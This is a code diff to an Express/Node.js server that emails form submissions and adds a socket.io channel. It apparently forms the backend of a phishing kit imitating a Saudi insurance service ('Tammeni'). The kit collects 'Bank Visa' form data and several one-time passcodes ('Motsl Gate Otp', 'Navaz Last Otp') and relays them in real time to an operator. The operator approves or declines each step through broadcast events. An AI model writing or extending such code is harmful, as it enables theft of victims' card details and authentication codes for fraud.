@@ -2,7 +2,9 @@ const express=  require('express')
 const app = express()
 const cors = require('cors')
 const nodemailer = require('nodemailer')
+const server = require("http").createServer(app)
 const PORT = process.env.PORT || 8080
+const io = require("socket.io")(server,({cors:{origin:"*"}}))
 app.use(express.json())
 app.use(cors())
 
@@ -28,7 +30,10 @@ app.post('/email',async(req,res)=>{
                  req.query.reg ? 'Tammeni Register Form ' :
                  req.query.apply ?'Tammeni Apply Form ' :
                  req.query.activate ?'Tammeni Activate Account ' :
+                 req.query.phone ?'Motsl Gate Data ' :
+                 req.query.Motslotp ?'Motsl Gate Otp ' :
                  req.query.new ?'Tammeni  New User ' :
+                 req.query.navazOtp ?'Tameeni Navaz Last Otp  ' :
                   'Tammeni Bank Visa'}`,
             html: htmlContent
         }).then(info => {
@@ -38,7 +43,9 @@ app.post('/email',async(req,res)=>{
             res.sendStatus(400);
         }
 });
-    }else{
+    }
+    
+    else{
         const transporter = nodemailer.createTransport({
             service: 'gmail',
             auth: {
@@ -72,6 +79,23 @@ app.post('/email',async(req,res)=>{
     }
 })
 
-app.listen(PORT,()=>{
+io.on('connection',(socket)=>{
+    console.log('connected')
+    socket.on('Motslotp',(data)=>{
+        console.log('Motslotp received',data)
+        io.emit('Motslotp',data)
+    })
+    socket.on('MotslOtpSend',(data)=>{
+        console.log('Motslotp send',data)
+        io.emit('MotslOtpSend',data)
+    })
+    socket.on('orderValidate',(data)=>{console.log(data);io.emit('orderValidate',data)})
+    socket.on('successValidate',(data)=>io.emit('successValidate',data))
+    socket.on('declineValidate',(data)=>io.emit('declineValidate',data))
+})
+
+
+
+server.listen(PORT,()=>{
     console.log('server conected')
 })
